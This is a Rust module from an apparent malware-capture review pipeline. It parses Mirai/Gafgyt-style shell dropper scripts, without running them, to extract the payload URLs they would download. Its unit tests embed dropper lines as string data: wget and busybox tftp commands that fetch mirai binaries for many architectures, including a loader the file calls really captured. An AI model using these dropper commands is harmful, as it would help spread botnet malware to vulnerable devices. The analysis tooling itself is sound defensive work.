//! Embedded payload-URL extraction from a fetched dropper script.
//!
//! A captured HTTP/TFTP payload is often not the final malware binary but a shell dropper
//! (classic Mirai/Gafgyt `bins.sh` style) that fetches the real binaries itself, one per
//! architecture. This module is pure text scanning - no I/O, no shell execution - that pulls the
//! URLs such a script would fetch, so the review pipeline can queue them as follow-up fetches.
//!
//! This is deliberately NOT a shell interpreter. It resolves exactly two constructs real captured
//! loaders use:
//! - simple scalar assignments (`VAR="value"` / `VAR='value'` / `VAR=word`, one per line, last
//!   assignment wins, values may reference earlier vars);
//! - a single level of `for VAR in WORDS; do` where `WORDS` is either literal whitespace-separated
//!   words or a single `$OTHERVAR` resolved from the assignment map.
//!
//! Command substitution (`` $(...) ``, backticks), arithmetic (`$((...))`), parameter expansion
//! (`${VAR:-default}`), and nested loops are out of scope: any URL token that still contains an
//! unresolved `$` after assignment substitution and (at most one) loop expansion is dropped rather
//! than emitted as a broken template. `tftp -g -r <file> <host>` is synthesized into a
//! `tftp://<host>/<file>` URL using the same assignment substitution, but without loop expansion -
//! no captured loader has needed it, and adding it would widen the scope for no observed benefit.

use std::collections::{HashMap, HashSet};

/// Bodies larger than this are not scanned; a legitimate dropper script is a few KB at most, and
/// this bounds the cost of the scan itself.
const MAX_BODY_LEN: usize = 64 * 1024;

/// Hard cap on emitted URLs. Without this, a `for` loop over a large word list could make the
/// fetcher enqueue an unbounded number of follow-up fetches - a fan-out amplification a malicious
/// script could trigger deliberately. The total-fetch budget is also enforced downstream; this is
/// the source-side guard.
const MAX_URLS: usize = 256;

/// Extract embedded `http://`, `https://`, and synthesized `tftp://` payload URLs from a captured
/// dropper script body. Returns an empty `Vec` if `body` is larger than 64 KB or is not valid
/// UTF-8 text.
pub fn extract_urls(body: &[u8]) -> Vec<String> {
    if body.len() > MAX_BODY_LEN {
        return Vec::new();
    }
    let Ok(text) = std::str::from_utf8(body) else {
        return Vec::new();
    };

    let vars = parse_assignments(text);
    let loops = parse_for_loops(text, &vars);

    let mut urls = Vec::new();
    let mut seen = HashSet::new();

    for raw in scan_url_tokens(text) {
        for url in expand_token(&raw, &vars, &loops) {
            if urls.len() >= MAX_URLS {
                return urls;
            }
            if seen.insert(url.clone()) {
                urls.push(url);
            }
        }
    }

    for (file, host) in scan_tftp_pairs(text) {
        if urls.len() >= MAX_URLS {
            return urls;
        }
        let file_r = substitute_vars(&file, &vars);
        let host_r = substitute_vars(&host, &vars);
        if file_r.contains('$') || host_r.contains('$') {
            continue;
        }
        let url = format!("tftp://{host_r}/{file_r}");
        if seen.insert(url.clone()) {
            urls.push(url);
        }
    }

    urls
}

/// Parse simple `VAR="value"` / `VAR='value'` / `VAR=word` assignments, one per line. Later
/// assignments to the same name overwrite earlier ones (processed top-to-bottom), and a value may
/// reference vars assigned on earlier lines (already-resolved by the time this line runs).
fn parse_assignments(text: &str) -> HashMap<String, String> {
    let mut vars: HashMap<String, String> = HashMap::new();
    for line in text.lines() {
        let trimmed = line.trim_start();
        let Some(name_len) = leading_ident_len(trimmed) else {
            continue;
        };
        if name_len == 0 || trimmed.as_bytes().get(name_len) != Some(&b'=') {
            continue;
        }
        let name = &trimmed[..name_len];
        let rest = &trimmed[name_len + 1..];
        let value = parse_assignment_value(rest, &vars);
        vars.insert(name.to_string(), value);
    }
    vars
}

/// Length in bytes of a leading shell identifier (`[A-Za-z_][A-Za-z0-9_]*`) at the start of `s`,
/// or `None` if `s` does not start with an identifier character.
fn leading_ident_len(s: &str) -> Option<usize> {
    let mut chars = s.char_indices();
    match chars.next() {
        Some((_, c)) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return None,
    }
    let mut end = s.len();
    for (i, c) in chars {
        if !(c.is_ascii_alphanumeric() || c == '_') {
            end = i;
            break;
        }
    }
    Some(end)
}

/// Extract the raw value text after `VAR=` (quote-stripped or the first unquoted word) and
/// resolve any `$VAR` / `${VAR}` references against already-assigned vars.
fn parse_assignment_value(rest: &str, vars: &HashMap<String, String>) -> String {
    let raw_value = if let Some(stripped) = rest.strip_prefix('"') {
        stripped.find('"').map_or(stripped, |end| &stripped[..end])
    } else if let Some(stripped) = rest.strip_prefix('\'') {
        stripped.find('\'').map_or(stripped, |end| &stripped[..end])
    } else {
        let end = rest
            .find(|c: char| c.is_whitespace() || c == ';' || c == '#')
            .unwrap_or(rest.len());
        &rest[..end]
    };
    substitute_vars(raw_value, vars)
}

/// Parse `for VAR in WORDS; do` (or `for VAR in WORDS do`, or a `for` line whose `WORDS` runs to
/// end of line with `do` on the next line) into a map of loop variable -> resolved word list.
/// `WORDS` is either literal whitespace-separated words or a single `$OTHERVAR` / `${OTHERVAR}`
/// resolved from `vars`.
fn parse_for_loops(text: &str, vars: &HashMap<String, String>) -> HashMap<String, Vec<String>> {
    let mut loops = HashMap::new();
    for line in text.lines() {
        let trimmed = line.trim();
        let Some(after_for) = trimmed.strip_prefix("for ") else {
            continue;
        };
        let mut tokens = after_for.split_whitespace();
        let Some(loop_var) = tokens.next() else {
            continue;
        };
        if !is_valid_ident(loop_var) {
            continue;
        }
        match tokens.next() {
            Some("in") => {}
            _ => continue,
        }

        let mut words: Vec<String> = Vec::new();
        for tok in tokens {
            if tok == "do" {
                break;
            }
            if let Some(stripped) = tok.strip_suffix(';') {
                if !stripped.is_empty() {
                    words.push(stripped.to_string());
                }
                break;
            }
            words.push(tok.to_string());
        }

        let resolved = if words.len() == 1 {
            match single_var_ref(&words[0]) {
                Some(name) => vars
                    .get(&name)
                    .map(|v| v.split_whitespace().map(str::to_string).collect())
                    .unwrap_or_default(),
                None => words,
            }
        } else {
            words
        };

        loops.insert(loop_var.to_string(), resolved);
    }
    loops
}

/// If `word` is exactly `$NAME` or `${NAME}` (nothing else), return `NAME`.
fn single_var_ref(word: &str) -> Option<String> {
    if let Some(inner) = word.strip_prefix("${") {
        let name = inner.strip_suffix('}')?;
        return is_valid_ident(name).then(|| name.to_string());
    }
    let name = word.strip_prefix('$')?;
    is_valid_ident(name).then(|| name.to_string())
}

fn is_valid_ident(s: &str) -> bool {
    let mut chars = s.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// A URL token terminates on whitespace, a quote, `;`, `|`, `)`, `>`, or `&`.
fn is_terminator(ch: char) -> bool {
    ch.is_whitespace() || matches!(ch, '\'' | '"' | ';' | '|' | ')' | '>' | '&')
}

/// Scan `text` for raw `http://`/`https://` tokens (unresolved - variable substitution and loop
/// expansion happen in [`expand_token`]).
fn scan_url_tokens(text: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut idx = 0;
    while idx < text.len() {
        let rest = &text[idx..];
        let scheme_len = if rest.starts_with("https://") {
            8
        } else if rest.starts_with("http://") {
            7
        } else {
            0
        };
        if scheme_len > 0 {
            let mut end = idx + scheme_len;
            for (off, ch) in rest[scheme_len..].char_indices() {
                if is_terminator(ch) {
                    break;
                }
                end = idx + scheme_len + off + ch.len_utf8();
            }
            tokens.push(text[idx..end].to_string());
            idx = end;
        } else {
            let ch_len = rest.chars().next().map_or(1, |c| c.len_utf8());
            idx += ch_len;
        }
    }
    tokens
}

/// Scan for `tftp -g -r <file> <host>` invocations (whitespace-tokenized), returning raw
/// `(file, host)` pairs, unresolved.
fn scan_tftp_pairs(text: &str) -> Vec<(String, String)> {
    let tokens: Vec<&str> = text.split_whitespace().collect();
    let mut pairs = Vec::new();
    let mut i = 0;
    while i < tokens.len() {
        if tokens[i] == "tftp"
            && i + 4 < tokens.len()
            && tokens[i + 1] == "-g"
            && tokens[i + 2] == "-r"
        {
            pairs.push((tokens[i + 3].to_string(), tokens[i + 4].to_string()));
            i += 5;
        } else {
            i += 1;
        }
    }
    pairs
}

/// Resolve a raw URL token against assignments, then (if exactly one var remains unresolved and
/// it is a `for`-loop control variable) expand it into one URL per loop word. Returns an empty
/// `Vec` if the token cannot be fully resolved - never emits a URL with a literal `$` left in it.
fn expand_token(
    raw: &str,
    vars: &HashMap<String, String>,
    loops: &HashMap<String, Vec<String>>,
) -> Vec<String> {
    let after_vars = substitute_vars(raw, vars);
    if !after_vars.contains('$') {
        return vec![after_vars];
    }

    let refs = find_var_refs(&after_vars);
    if refs.len() == 1
        && let Some(words) = loops.get(&refs[0])
    {
        let mut out = Vec::new();
        for word in words {
            let mut single = HashMap::new();
            single.insert(refs[0].clone(), word.clone());
            let expanded = substitute_vars(&after_vars, &single);
            if !expanded.contains('$') {
                out.push(expanded);
            }
        }
        return out;
    }

    Vec::new()
}

/// Replace every `$NAME` / `${NAME}` reference found in `vars` with its value. A reference not
/// present in `vars` is left untouched (literal `$NAME` / `${NAME}` in the output) so a later
/// stage can decide whether it is a loop variable or truly unresolved.
fn substitute_vars(input: &str, vars: &HashMap<String, String>) -> String {
    let chars: Vec<char> = input.chars().collect();
    let mut out = String::with_capacity(input.len());
    let mut i = 0;
    while i < chars.len() {
        if chars[i] != '$' || i + 1 >= chars.len() {
            out.push(chars[i]);
            i += 1;
            continue;
        }
        if chars[i + 1] == '{' {
            if let Some(end) = find_close_brace(&chars, i + 2) {
                let name: String = chars[i + 2..end].iter().collect();
                match vars.get(&name) {
                    Some(val) => out.push_str(val),
                    None => out.extend(&chars[i..=end]),
                }
                i = end + 1;
                continue;
            }
            out.push('$');
            i += 1;
            continue;
        }
        if chars[i + 1].is_ascii_alphabetic() || chars[i + 1] == '_' {
            let start = i + 1;
            let mut end = start;
            while end < chars.len() && (chars[end].is_ascii_alphanumeric() || chars[end] == '_') {
                end += 1;
            }
            let name: String = chars[start..end].iter().collect();
            match vars.get(&name) {
                Some(val) => out.push_str(val),
                None => out.extend(&chars[i..end]),
            }
            i = end;
            continue;
        }
        out.push('$');
        i += 1;
    }
    out
}

/// Find the byte offset of the `}` closing a `${...}` reference started at `start`, requiring
/// everything in between to be identifier characters (so `${VAR:-default}` - out of scope
/// parameter expansion - correctly returns `None` rather than being mistaken for a plain var).
fn find_close_brace(chars: &[char], start: usize) -> Option<usize> {
    let mut i = start;
    while i < chars.len() {
        if chars[i] == '}' {
            return Some(i);
        }
        if !(chars[i].is_ascii_alphanumeric() || chars[i] == '_') {
            return None;
        }
        i += 1;
    }
    None
}

/// Collect the distinct `$NAME` / `${NAME}` variable names still referenced in `s`, in order of
/// first appearance.
fn find_var_refs(s: &str) -> Vec<String> {
    let chars: Vec<char> = s.chars().collect();
    let mut names = Vec::new();
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '$' && i + 1 < chars.len() {
            if chars[i + 1] == '{' {
                if let Some(end) = find_close_brace(&chars, i + 2) {
                    let name: String = chars[i + 2..end].iter().collect();
                    if !names.contains(&name) {
                        names.push(name);
                    }
                    i = end + 1;
                    continue;
                }
            } else if chars[i + 1].is_ascii_alphabetic() || chars[i + 1] == '_' {
                let start = i + 1;
                let mut end = start;
                while end < chars.len() && (chars[end].is_ascii_alphanumeric() || chars[end] == '_')
                {
                    end += 1;
                }
                let name: String = chars[start..end].iter().collect();
                if !names.contains(&name) {
                    names.push(name);
                }
                i = end;
                continue;
            }
        }
        i += 1;
    }
    names
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extracts_arch_urls_from_a_bins_script() {
        let s = b"#!/bin/sh\nwget http://5.6.7.8/mirai.x86 -O a; wget http://5.6.7.8/mirai.arm7\n\
                  busybox tftp -g -r m.mips 5.6.7.8\n";
        let urls = extract_urls(s);
        assert!(urls.contains(&"http://5.6.7.8/mirai.x86".to_string()));
        assert!(urls.contains(&"http://5.6.7.8/mirai.arm7".to_string()));
    }

    #[test]
    fn ignores_binary_and_oversize_bodies() {
        assert!(extract_urls(&[0u8, 159, 146, 150]).is_empty());
        assert!(extract_urls(&vec![b'a'; 70_000]).is_empty());
    }

    #[test]
    fn expands_interpolated_arch_loop_from_a_real_captured_loader() {
        let s = br#"#!/bin/sh
ARCHS="arm arm5 arm7 mips mpsl sh4 m68k ppc ppc440fp spc"
SERVER="185.93.89.72"
for arch in $ARCHS; do
  (wget "http://$SERVER/mirai.$arch" -O- || busybox wget "http://$SERVER/mirai.$arch" -O-) > hDvrHelper
done
"#;
        let urls = extract_urls(s);

        let expected = [
            "arm", "arm5", "arm7", "mips", "mpsl", "sh4", "m68k", "ppc", "ppc440fp", "spc",
        ];
        for arch in expected {
            let want = format!("http://185.93.89.72/mirai.{arch}");
            assert!(urls.contains(&want), "missing {want} in {urls:?}");
        }
        assert_eq!(
            urls.len(),
            expected.len(),
            "unexpected extra urls: {urls:?}"
        );
        assert!(
            urls.iter().all(|u| !u.contains('$')),
            "a template url leaked through: {urls:?}"
        );
    }

    #[test]
    fn substitutes_brace_form_variable() {
        let s = b"SERVER=1.2.3.4\nwget http://${SERVER}/x.bin\n";
        let urls = extract_urls(s);
        assert_eq!(urls, vec!["http://1.2.3.4/x.bin".to_string()]);
    }

    #[test]
    fn drops_url_with_unresolved_variable() {
        let s = b"wget http://$MISSING/x.bin\n";
        let urls = extract_urls(s);
        assert!(urls.is_empty(), "expected no urls, got {urls:?}");
    }

    #[test]
    fn caps_loop_expansion_at_256_and_does_not_hang() {
        let words: Vec<String> = (0..300).map(|i| format!("a{i}")).collect();
        let body = format!(
            "ARCHS=\"{}\"\nfor arch in $ARCHS; do\nwget http://5.6.7.8/x.$arch\ndone\n",
            words.join(" ")
        );
        let urls = extract_urls(body.as_bytes());
        assert_eq!(urls.len(), 256);
        assert!(urls.iter().all(|u| !u.contains('$')));
    }
}
